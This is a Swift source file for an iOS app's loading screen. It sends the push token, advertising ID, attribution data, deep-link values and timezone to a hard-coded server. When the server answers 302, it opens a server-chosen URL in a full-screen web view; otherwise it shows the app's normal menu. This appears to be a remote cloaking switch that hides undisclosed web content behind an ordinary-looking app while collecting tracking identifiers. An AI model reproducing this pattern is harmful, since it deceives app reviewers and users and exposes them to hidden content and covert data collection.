import UIKit
import GameKit

class LoadingVC: UIViewController, URLSessionDelegate {
    
    var loadingIndicator: UIActivityIndicatorView!
    
    var appDelegate = UIApplication.shared.delegate as? AppDelegate
    
    var titleLabel: UILabel!
    
    var urlResponse = ""
    
    override var supportedInterfaceOrientations: UIInterfaceOrientationMask {
        return .portrait
    }

    override func viewDidLoad() {
        super.viewDidLoad()
        loadingIndicator = UIActivityIndicatorView()
        
        loadingIndicator.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(loadingIndicator)
        
        NSLayoutConstraint.activate([
            loadingIndicator.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            loadingIndicator.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -30)
        ])
        
        loadingIndicator.startAnimating()
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge], completionHandler: {
            success, error in
            guard success else {
                return
            }
            self.sendToRequest()
        })
      
    }
    
    func sendToRequest() {
        
        //MARK: Link to server
        
        let url = URL(string: "https://xleopatraxards.fan/starting")

        let dictionariData: [String: Any?] = ["facebook-deeplink" : appDelegate?.facebookDeepLink, "push-token" : appDelegate?.token, "appsflyer" : appDelegate?.oldAndNotWorkingNames, "deep_link_sub2" : appDelegate?.deep_link_sub2, "deepLinkStr": appDelegate?.deepLinkStr, "timezone-geo": appDelegate?.localizationTimeZoneAbbrtion, "timezome-gmt" : appDelegate?.currentTimeZone, "apps-flyer-id": appDelegate!.id, "attribution-data" : appDelegate?.dataAttribution, "deep_link_sub1" : appDelegate?.deep_link_sub1, "deep_link_sub3" : appDelegate?.deep_link_sub3, "deep_link_sub4" : appDelegate?.deep_link_sub4, "deep_link_sub5" : appDelegate?.deep_link_sub5]
        
        //MARK: Requset
        var request = URLRequest(url: url!)
        print(dictionariData)
        //MARK: JSON packing
        let json = try? JSONSerialization.data(withJSONObject: dictionariData)
        request.httpBody = json
        request.httpMethod = "POST"
        request.addValue(appDelegate!.idfa, forHTTPHeaderField: "GID")
        request.addValue(Bundle.main.bundleIdentifier!, forHTTPHeaderField: "PackageName")
        request.addValue(appDelegate!.id, forHTTPHeaderField: "ID")
        
        //MARK: URLSession Configuration
        let configuration = URLSessionConfiguration.ephemeral
        configuration.waitsForConnectivity = false
        configuration.timeoutIntervalForResource = 30
        configuration.timeoutIntervalForRequest = 30
        let session = URLSession(configuration: configuration, delegate: self, delegateQueue: OperationQueue.main)
        
        //MARK: Data Task
        let task = session.dataTask(with: request) { (data, response, error) in
            guard let data = data, error == nil else {
                DispatchQueue.main.async {
                    self.performSegue(withIdentifier: "menu", sender: self)
                }
                return
            }
            //MARK: HTTPURL Response
            if let response = response as? HTTPURLResponse {
                if response.statusCode == 302 {
                    //MARK: JSON Response
                    let responseJSON = try? JSONSerialization.jsonObject(with: data, options: [])
                    if let responseJSON = responseJSON as? [String: Any] {
                        guard let result = responseJSON["result"] as? String else { return }
                        let webView = WebVC()
                        webView.urlString = result
                        webView.modalPresentationStyle = .fullScreen
                        DispatchQueue.main.async {
                            self.present(webView, animated: true)
                        }
                    }
                } else  if response.statusCode  == 200 {
                    DispatchQueue.main.async {
                        self.performSegue(withIdentifier: "menu", sender: self)
                    }
                } else {
                    DispatchQueue.main.async {
                        self.performSegue(withIdentifier: "menu", sender: self)
                    }
                }
            }
            return
        }
        task.resume()
    }


}
